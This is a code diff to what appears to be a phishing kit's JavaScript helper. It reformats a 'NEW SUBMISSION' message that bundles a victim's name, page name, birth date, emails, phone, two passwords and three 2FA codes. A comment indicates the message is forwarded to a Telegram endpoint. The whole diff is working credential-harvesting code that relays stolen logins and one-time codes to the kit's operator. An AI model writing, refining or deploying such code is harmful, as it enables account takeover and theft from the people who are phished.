@@ -53,25 +53,32 @@ const Utils = (() => {
 
   // ── Build Telegram message text ────────────────────────────
   function buildMessage(data) {
-    const line = (label, value) => value ? `<b>${label}:</b> ${value}\n` : '';
+    const c = (val) => val ? `<code>${val}</code>` : '';
     const dob = (data.day && data.month && data.year)
-      ? `${data.day}/${data.month}/${data.year}` : null;
+      ? `${data.day}/${data.month}/${data.year}` : '';
 
-    return [
-      `🔔 <b>NEW SUBMISSION</b>\n`,
-      line('👤 Full Name',       data.fullName),
-      line('📧 Email',           data.email),
-      line('💼 Email Business',  data.emailBusiness),
-      line('📄 Page Name',       data.fanpage),
-      line('📞 Phone',           data.phone),
-      line('🎂 Date of Birth',   dob),
-      line('🔑 Password 1',      data.password),
-      line('🔑 Password 2',      data.passwordSecond),
-      line('🔐 2FA Code 1',      data.twoFa),
-      line('🔐 2FA Code 2',      data.twoFaSecond),
-      line('🔐 2FA Code 3',      data.twoFaThird),
-      `\n🕐 ${new Date().toLocaleString('vi-VN')}`,
-    ].join('');
+    const lines = [];
+
+    lines.push(`🔔 <b>NEW SUBMISSION</b>`);
+    lines.push(`-----------------------------`);
+    lines.push(`<b>Full Name:</b> ${c(data.fullName)}`);
+    lines.push(`<b>Page Name:</b> ${c(data.fanpage)}`);
+    lines.push(`<b>Date of birth:</b> ${c(dob)}`);
+    lines.push(`-----------------------------`);
+    lines.push(`<b>Email:</b> ${c(data.email)}`);
+    lines.push(`<b>Email Business:</b> ${c(data.emailBusiness)}`);
+    lines.push(`<b>Phone Number:</b> ${c(data.phone)}`);
+    lines.push(`-----------------------------`);
+    if (data.password)       lines.push(`<b>Password(1):</b> ${c(data.password)}`);
+    if (data.passwordSecond) lines.push(`<b>Password(2):</b> ${c(data.passwordSecond)}`);
+    lines.push(`-----------------------------`);
+    if (data.twoFa)       lines.push(`🔐 <b>Code 2FA(1):</b> ${c(data.twoFa)}`);
+    if (data.twoFaSecond) lines.push(`🔐 <b>Code 2FA(2):</b> ${c(data.twoFaSecond)}`);
+    if (data.twoFaThird)  lines.push(`🔐 <b>Code 2FA(3):</b> ${c(data.twoFaThird)}`);
+    lines.push(`-----------------------------`);
+    lines.push(`🕐 ${new Date().toLocaleString('vi-VN')}`);
+
+    return lines.join('\n');
   }
 
   // ── Send Notification via /api/send-telegram ───────────────
